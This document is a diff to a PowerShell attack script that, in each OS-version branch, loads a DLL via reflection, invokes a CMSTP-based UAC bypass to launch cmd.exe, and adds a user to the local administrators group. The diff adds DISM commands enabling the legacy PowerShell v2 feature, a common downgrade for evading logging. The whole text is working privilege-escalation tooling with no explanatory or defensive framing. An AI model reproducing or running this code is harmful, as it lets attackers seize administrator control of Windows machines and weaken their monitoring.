@@ -37,7 +37,8 @@ switch ($OSVersion)
         [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
         [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
-  
+        # Powershellv2 enable
+        Dism /online /Enable-Feature /FeatureName:"MicrosoftWindowsPowerShellV2Root" -All
         If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
         {
         # Relaunch as an elevated process:
@@ -56,6 +57,8 @@ switch ($OSVersion)
         [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
         [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
+        # Powershellv2 enable
+        Dism /online /Enable-Feature /FeatureName:"MicrosoftWindowsPowerShellV2Root" -All
         # Add User to ADMIN Group 
         net localgroup administrators $user /add
         If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
@@ -76,7 +79,7 @@ switch ($OSVersion)
         [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
         [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
-  
+        Dism /online /Enable-Feature /FeatureName:"MicrosoftWindowsPowerShellV2Root" -All
         If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
         {
         # Relaunch as an elevated process:
@@ -95,6 +98,8 @@ switch ($OSVersion)
         [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
 
         [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
+        # Powershellv2 enable
+        Dism /online /Enable-Feature /FeatureName:"MicrosoftWindowsPowerShellV2Root" -All        
         # Add User to ADMIN Group 
         net localgroup administrators $user /add
         If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
